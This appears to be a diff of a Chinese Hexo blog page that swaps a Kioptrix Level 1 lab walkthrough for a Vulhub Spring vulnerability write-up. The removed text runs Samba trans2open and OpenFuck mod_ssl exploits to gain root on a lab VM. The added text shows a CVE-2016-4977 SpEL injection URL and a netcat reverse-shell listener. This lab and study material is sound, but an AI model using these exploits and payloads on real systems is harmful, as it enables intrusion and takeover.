@@ -17,7 +17,7 @@
   <meta name="description" content="">
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
-  <title>Kioptix Level 1 - Hexo</title>
+  <title>vulhub-Spring复现 - Hexo</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
 
@@ -152,8 +152,8 @@
               
   <div class="mt-3 post-meta">
     <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-    <time datetime="2020-10-18 15:38">
-      2020年10月18日 下午
+    <time datetime="2020-10-25 17:53">
+      2020年10月25日 下午
     </time>
   </div>
 
@@ -163,7 +163,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      1.3k 字
+      307 字
     </span>
   
 
@@ -173,7 +173,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      22
+      3
        分钟
     </span>
   
@@ -204,140 +204,20 @@
           <div class="post-content mx-auto" id="post">
             
             <article class="markdown-body">
-              <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>&nbsp;&nbsp;This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.</p>
-<p>&nbsp;&nbsp;该靶机来自vulnhub，部署在VMware上</p>
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>&nbsp;&nbsp;靶机登录无提供用户名密码，需要自己解决</p>
-<p>&nbsp;&nbsp;nmap先找靶机ip</p>
-<pre><code>nmap -sP 192.168.1.135/24//本机
-
-//扫描结果
-Nmap scan report for 192.168.1.104
-Host is up (0.00012s latency).
-MAC Address: 00:0C:29:FE:5E:95 (VMware)</code></pre><p>&nbsp;&nbsp;找到靶机，nmap继续扫，顺便扫扫目录</p>
-<pre><code>nmap -sV -T4 -A 192.168.1.104
-
-//扫描结果
-22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
-| ssh-hostkey: 
-|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
-|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
-|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
-|_sshv1: Server supports SSHv1
-80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
-| http-methods: 
-|_  Potentially risky methods: TRACE
-|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
-|_http-title: Test Page for the Apache Web Server on Red Hat Linux
-111/tcp  open  rpcbind     2 (RPC #100000)
-139/tcp  open  netbios-ssn Samba smbd (workgroup: nMYGROUP)
-443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
-|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
-|_http-title: 400 Bad Request
-|_ssl-date: 2020-10-18T07:54:27+00:00; +1m49s from scanner time.
-| sslv2: 
-|   SSLv2 supported
-|   ciphers: 
-|     SSL2_RC2_128_CBC_WITH_MD5
-|     SSL2_RC4_64_WITH_MD5
-|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
-|     SSL2_DES_192_EDE3_CBC_WITH_MD5
-|     SSL2_RC4_128_EXPORT40_WITH_MD5
-|     SSL2_RC4_128_WITH_MD5
-|_    SSL2_DES_64_CBC_WITH_MD5
-1024/tcp open  status      1 (RPC #100024)
-
-//看到使用了samba和mod_ssl</code></pre><p>&nbsp;&nbsp;登录靶机网站是个测试界面，wappalyzer也看不出啥，目录扫出了几个但没啥思路</p>
-<pre><code>==&gt; DIRECTORY: http://192.168.1.104/manual/                                                                                                 
-==&gt; DIRECTORY: http://192.168.1.104/mrtg/                                                                                                   
-==&gt; DIRECTORY: http://192.168.1.104/usage/ </code></pre><p>&nbsp;&nbsp;先确定samba的版本来找exp</p>
-<p>&nbsp;&nbsp;进入msf用smb_version工具来判断版本</p>
-<pre><code>msf5 &gt; use auxiliary/scanner/smb/smb_version 
-msf5 auxiliary(scanner/smb/smb_version) &gt; set RHOSTS 192.168.1.104
-RHOSTS =&gt; 192.168.1.104
-msf5 auxiliary(scanner/smb/smb_version) &gt; run
-
-[*] 192.168.1.104:139     - Host could not be identified: Unix (Samba 2.2.1a)
-[*] 192.168.1.104:445     - Scanned 1 of 1 hosts (100% complete)
-[*] Auxiliary module execution completed</code></pre><h2 id="搜索漏洞"><a href="#搜索漏洞" class="headerlink" title="搜索漏洞"></a>搜索漏洞</h2><pre><code>root@kali:~/桌面# searchsploit samba 2.2.1.a
------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
- Exploit Title                                                                                                                           |  Path
------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
-Samba 2.2.0 &lt; 2.2.8 (OSX) - trans2open Overflow (Metasploit)                                                                             | osx/remote/9924.rb
-Samba &lt; 2.2.8 (Linux/BSD) - Remote Code Execution                                                                                        | multiple/remote/10.c
-Samba &lt; 3.0.20 - Remote Heap Overflow                                                                                                    | linux/remote/7701.txt
-Samba &lt; 3.6.2 (x86) - Denial of Service (PoC)                                                                                            | linux_x86/dos/36741.py
------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
-Shellcodes: No Results</code></pre><p>&nbsp;&nbsp;这里samba选择Remote Code Execution这个版本的exp</p>
-<p>&nbsp;&nbsp;再看看另一个mod_ssl/2.8.4用的exp</p>
-<pre><code>----------------------------------------------------------------------------------------------------------- ---------------------------------
- Exploit Title                                                                                             |  Path
------------------------------------------------------------------------------------------------------------ ---------------------------------
-Apache mod_ssl 2.0.x - Remote Denial of Service                                                            | linux/dos/24590.txt
-Apache mod_ssl 2.8.x - Off-by-One HTAccess Buffer Overflow                                                 | multiple/dos/21575.txt
-Apache mod_ssl &lt; 2.8.7 OpenSSL - &apos;OpenFuck.c&apos; Remote Buffer Overflow                                       | unix/remote/21671.c
-Apache mod_ssl &lt; 2.8.7 OpenSSL - &apos;OpenFuckV2.c&apos; Remote Buffer Overflow (1)                                 | unix/remote/764.c
-Apache mod_ssl &lt; 2.8.7 OpenSSL - &apos;OpenFuckV2.c&apos; Remote Buffer Overflow (2)                                 | unix/remote/47080.c
-Apache mod_ssl OpenSSL &lt; 0.9.6d / &lt; 0.9.7-beta2 - &apos;openssl-too-open.c&apos; SSL2 KEY_ARG Overflow               | unix/remote/40347.txt
------------------------------------------------------------------------------------------------------------ ---------------------------------
-Shellcodes: No Results
-Papers: No Results</code></pre><p>&nbsp;&nbsp;这里使用OpenSSL - ‘OpenFuckV2.c’ Remote Buffer Overflow (2) 来进行</p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="samba"><a href="#samba" class="headerlink" title="samba"></a>samba</h3><p>&nbsp;&nbsp;gcc编译看看exp怎么用</p>
-<pre><code>root@kali:~/桌面/samba# gcc 10.c -o samba
-root@kali:~/桌面/samba# ./samba 
-samba-2.2.8 &lt; remote root exploit by eSDee (www.netric.org|be)
---------------------------------------------------------------
-Usage: ./samba [-bBcCdfprsStv] [host]
-
--b &lt;platform&gt;   bruteforce (0 = Linux, 1 = FreeBSD/NetBSD, 2 = OpenBSD 3.1 and prior, 3 = OpenBSD 3.2)
--B &lt;step&gt;       bruteforce steps (default = 300)
--c &lt;ip address&gt; connectback ip address
--C &lt;max childs&gt; max childs for scan/bruteforce mode (default = 40)
--d &lt;delay&gt;      bruteforce/scanmode delay in micro seconds (default = 100000)
--f              force
--p &lt;port&gt;       port to attack (default = 139)
--r &lt;ret&gt;        return address
--s              scan mode (random)
--S &lt;network&gt;    scan mode
--t &lt;type&gt;       presets (0 for a list)
--v              verbose mode</code></pre><p>&nbsp;&nbsp;启动</p>
-<pre><code>root@kali:~/桌面/samba# ./samba -b=0 -c 192.168.1.135 192.168.1.104
-samba-2.2.8 &lt; remote root exploit by eSDee (www.netric.org|be)
---------------------------------------------------------------
-+ Bruteforce mode. (Linux)
-+ Host is running samba.
-+ Worked!
---------------------------------------------------------------
-*** JE MOET JE MUIL HOUWE
-Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown
-uid=0(root) gid=0(root) groups=99(nobody)</code></pre><p>&nbsp;&nbsp;特别流畅的就完成了，看一下权限</p>
-<p><img src="https://i.loli.net/2020/10/18/Ituoh94TlSMFzG5.png" srcset="/img/loading.gif" alt=""></p>
-<p>&nbsp;&nbsp;再按照提示里面的看看email</p>
-<p><img src="https://i.loli.net/2020/10/18/bAmwdMi6q2CDa4Z.png" srcset="/img/loading.gif" alt=""></p>
-<h3 id="mod-ssl"><a href="#mod-ssl" class="headerlink" title="mod_ssl"></a>mod_ssl</h3><p>&nbsp;&nbsp;像上面的进行编译发现缺少头文件，记录一下怎么做</p>
-<pre><code>sudo apt-get install apt-file
-sudo apt-file update
-apt-file search &quot;报错内容&quot;
-//这里缺的是libxtst-dev
-sudo apt-get install libxtst-dev//即可</code></pre><p>&nbsp;&nbsp;继续编译</p>
-<pre><code>gcc 47080.c -o mod_ssl -lcrypto//编译前需要看看源文件才知道加-lcrypto</code></pre><p>&nbsp;&nbsp;跑一下看看需要什么参数</p>
-<pre><code>*******************************************************************
-* OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *
-*******************************************************************
-* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
-* #hackarena  irc.brasnet.org                                     *
-* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
-* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
-* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
-*******************************************************************
-
-: Usage: ./mod_ssl target box [port] [-c N]
-
-  target - supported box eg: 0x00
-  box - hostname or IP address
-  port - port for ssl connection
-  -c open N connections. (use range 40-50 if u dont know)</code></pre><p>&nbsp;&nbsp;下面就是一堆机器os和服务版本对应的序列，这里只能找到apache对应两个版本 0x6a和0x6b 都跑跑</p>
-<pre><code>./mod_ssl 0x6a 192.168.1.104 -c 50//失败
-./mod_ssl 0x6b 192.168.1.104 -c 50//成功</code></pre><p><img src="https://i.loli.net/2020/10/18/QxRwHmKOIq1Mcn9.png" srcset="/img/loading.gif" alt=""></p>
+              <h2 id="Spring-Security-OAuth2-远程命令执行漏洞（CVE-2016-4977）"><a href="#Spring-Security-OAuth2-远程命令执行漏洞（CVE-2016-4977）" class="headerlink" title="Spring Security OAuth2 远程命令执行漏洞（CVE-2016-4977）"></a>Spring Security OAuth2 远程命令执行漏洞（CVE-2016-4977）</h2><p>&nbsp;&nbsp;Spring Security OAuth 是为 Spring 框架提供安全认证支持的一个模块。在其使用 whitelabel views 来处理错误时，由于使用了Springs Expression Language (SpEL)，攻击者在被授权的情况下可以通过构造恶意参数来远程执行命令。</p>
+<p>&nbsp;&nbsp;目标ip：192.168.1.130</p>
+<p>&nbsp;&nbsp;访问<a href="http://192.168.1.130:8080/oauth/authorize?response\_type=${233*233}&amp;client\_id=acme&amp;scope=openid&amp;redirect_uri=http://test" target="_blank" rel="noopener">http://192.168.1.130:8080/oauth/authorize?response\_type=${233*233}&amp;client\_id=acme&amp;scope=openid&amp;redirect_uri=http://test</a></p>
+<p><img src="https://i.loli.net/2020/10/25/7GxLTnEmfdDobPr.png" srcset="/img/loading.gif" alt=""></p>
+<p>&nbsp;&nbsp;可以发现233*233运行，证明可以交互，进行反弹shell，注意java反弹shell需要进行编码 <a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">链接</a></p>
+<p><img src="https://i.loli.net/2020/10/25/47asy9wgQP6tlLH.png" srcset="/img/loading.gif" alt=""></p>
+<p>&nbsp;&nbsp;然后利用python脚本生成poc</p>
+<p><img src="https://i.loli.net/2020/10/25/8MqzbUhATntYc7B.png" srcset="/img/loading.gif" alt=""></p>
+<p>&nbsp;&nbsp;kalibash监听</p>
+<pre><code>root@kali:~# nc -lvvp 8888</code></pre><p>&nbsp;&nbsp;poc填入response_type，接收到反弹shell</p>
+<p><img src="https://i.loli.net/2020/10/25/KIUrRWGoZxDnAM7.png" srcset="/img/loading.gif" alt=""></p>
+<h2 id="Spring-WebFlow-远程代码执行漏洞（CVE-2017-4971）"><a href="#Spring-WebFlow-远程代码执行漏洞（CVE-2017-4971）" class="headerlink" title="Spring WebFlow 远程代码执行漏洞（CVE-2017-4971）"></a>Spring WebFlow 远程代码执行漏洞（CVE-2017-4971）</h2><p>&nbsp;&nbsp;Spring WebFlow 是一个适用于开发基于流程的应用程序的框架（如购物逻辑），可以将流程的定义和实现流程行为的类和视图分离开来。在其 2.4.x 版本中，如果我们控制了数据绑定时的field，将导致一个SpEL表达式注入漏洞，最终造成任意命令执行。</p>
+<p>&nbsp;&nbsp;在此处点击confirm</p>
+<p><img src="https://i.loli.net/2020/10/25/1kEsYpVgXjwObZv.png" srcset="/img/loading.gif" alt=""></p>
 
             </article>
             <hr>
@@ -347,7 +227,7 @@ sudo apt-get install libxtst-dev//即可</code></pre><p>&nbsp;&nbsp;继续编译
                   <div class="post-meta mr-3">
                     <i class="iconfont icon-category"></i>
                     
-                      <a class="hover-with-bg" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a>
+                      <a class="hover-with-bg" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>
                     
                   </div>
                 
@@ -355,7 +235,7 @@ sudo apt-get install libxtst-dev//即可</code></pre><p>&nbsp;&nbsp;继续编译
                   <div class="post-meta">
                     <i class="iconfont icon-tags"></i>
                     
-                      <a class="hover-with-bg" href="/tags/Vulnhub/">Vulnhub</a>
+                      <a class="hover-with-bg" href="/tags/Vulhub/">Vulhub</a>
                     
                   </div>
                 
@@ -368,18 +248,12 @@ sudo apt-get install libxtst-dev//即可</code></pre><p>&nbsp;&nbsp;继续编译
                   <div class="post-prev col-6">
                     
                     
-                      <a href="/2020/10/25/vulhub-Spring%E5%A4%8D%E7%8E%B0/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">vulhub-Spring复现</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </div>
                   <div class="post-next col-6">
                     
                     
-                      <a href="/2020/09/10/Upload-Labs%E9%9D%B6%E5%9C%BA/">
-                        <span class="hidden-mobile">Upload-Labs靶场</span>
+                      <a href="/2020/10/18/Kioptix-Level-1/">
+                        <span class="hidden-mobile">Kioptix Level 1</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
@@ -518,7 +392,7 @@ sudo apt-get install libxtst-dev//即可</code></pre><p>&nbsp;&nbsp;继续编译
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "Kioptix Level 1&nbsp;",
+        "vulhub-Spring复现&nbsp;",
       ],
       cursorChar: "_",
       typeSpeed: 70,
